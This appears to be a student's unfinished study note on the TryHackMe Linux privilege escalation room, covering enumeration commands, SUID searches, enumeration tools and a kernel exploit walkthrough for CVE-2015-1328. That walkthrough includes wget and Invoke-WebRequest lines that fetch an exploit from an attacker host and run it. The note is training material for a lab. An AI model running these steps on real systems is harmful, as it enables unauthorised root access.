https://tryhackme.com/room/linprivesc

### Table of contents
- [[#y tho]]
- [[#Enumeration]] --> [[#`ps` -- Processes|`ps`]], [[#`find`|`find`]]
- [[#Automated Enumeration]]
- [[#Kernel Exploits]]
- 


___
### y tho
[[#Table of contents|Back to the top]]

- Resetting passwords  
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute administrative commands

___
### Enumeration
[[#Table of contents|Back to the top]]

1st step to take when gaining access to system

**`hostname`**
Target machine hostname, often meaningless (e.g. "Ubuntu-3487340239") but sometimes gives information about machine **role** (e.g. "SQL-PROD-01")

**`uname -a`**
System information --> **kernel**

**`/proc/version`**
Additional information about target **system process** --> **kernel** version, whether **compiler** is installed (e.g. GCC)

**`/etc/issue`**
**OS** info

##### `ps` -- Processes

- **PID:** process ID
- **TTY:** terminal type used by user
- **Time:** amount of CPU time used by the process (NOT time process has been running for)
- **CMD:** command/executable running (will NOT display any command line parameter)
	**`ps -A`:** all running processes
	**`ps axjf`:** process tree
	**`ps aux`:** process for all (a) users, which user (u) launched process, processes not attached to terminal (x); better understanding of system and **potential vulnerabilities**

**`env`**
**Environment** variables
--> **PATH** variable may have **compiler** / **scripting** language (e.g. Python) that could be used to run code on target system / leveraged for privilege escalation

**`sudo -l`**
List commands user can run using `sudo`

**`ls -la`**: ...

**`id`**
User's **privilege**, **group** memberships or other user's (`id <user_name>`)

**`/etc/passwd`**
Discover users on the system
Cut and convert for **brute-force**: **`cut -d ":" -f 1`**
Find real users: **`grep "home"`**

**`history`**
Sometimes gives up usernames and passwords

**`ifconfig`**
Network interface, useful info for **pivoting** to other target on network
	**`ip route`**: confirm ifconfig info

**`netstat`:** gather existing connections info
	**`-a`:** **a**ll listening ports and connections
	**`-at`/`-au`:** TCP/UDP 
	**`-l`:** ports in listening mode \*
	**`-s`:** network usage **s**tatistics \*
	**`-tp`:** connections with service name and PID, can be prepended with `-l`
	**`-i`:** **i**nterface statistics
	**`-ano`:** **a**ll sockets, **n**ot resolve names, display timers (o)

*\* can be combined with `-t`/`-u` for TCP/UDP*

##### `find`

- General syntax: **`find /directory/to/search -options`**
- **`2>/dev/null`:** redirect errors to /dev/null

- `-name secret.txt`
- `-name python*`
- `-type d -name config`: find directory named "config"

- `-type f -perm 0777`: read, write, execute for all
- `-type f -perm a=x`: execute for all
- `/home -type f -user frank`: find all files owned by frank under /home

- **`-mtime 10`\* :** files **m**odified in last 10 days (only content of file)
- **`-atime 10`\* :** files **a**ccessed in last 10 days
- **`-ctime 10` \* :** files **c**hanged in last 10 days (content of file and metadata)
*\* `time` can be replaced with **`min`** in order to display minutes instead of days*

- **`-size 50M`/`+50M`/`-50M`:** files with exactly / more than / less than 50 MB size
	
- **`-perm -u=s -type f 2>/dev/null`:** files with SUID bit --> run file with **higher privilege** than current user

___
### Automated Enumeration
[[#Table of contents|Back to the top]]

*Only used to save time: manual is better* 

Tool used depends on target system: unable to run Python tool if Python isn't installed on target

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

___
### Kernel Exploits
[[#Table of contents|Back to the top]]

*Kernel manages communication between components (memory, applications, ...)*

1. Identify **kernel version** -- `uname -a` / `/proc/version`
2. Search for **exploit**
3. **Transfer** exploit to target
	1. Set up python web server: **`python -m http.server 8000`**
	2. Download on target machine:
	   **`wget <attacker_IP>:8000/exploit -O /tmp/exploit`**
	   **`Invoke-WebRequest -uri <attacker-IP>:8000/exploit -outfile C:\\Windows\temp\exploit`**
	3. `chmod +x exploit`: make it executable
4. **Run** exploit: `./exploit`

**NB:** failed kernel exploit can lead to system crash

##### Practical
1. Kernel version: 3.13.0
2. Exploit-DB --> CVE-2015-1328
3. Compile: `gcc 37292.c -o exploit`
4. Set up web server: `python3 -m http.server 8000`
5. Download: `wget 10.81.70.121:8000/exploit -O /tmp/exploit`
6. Make it executable: `chmod +x exploit`
7. Run: `./exploit`

___
### Sudo
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
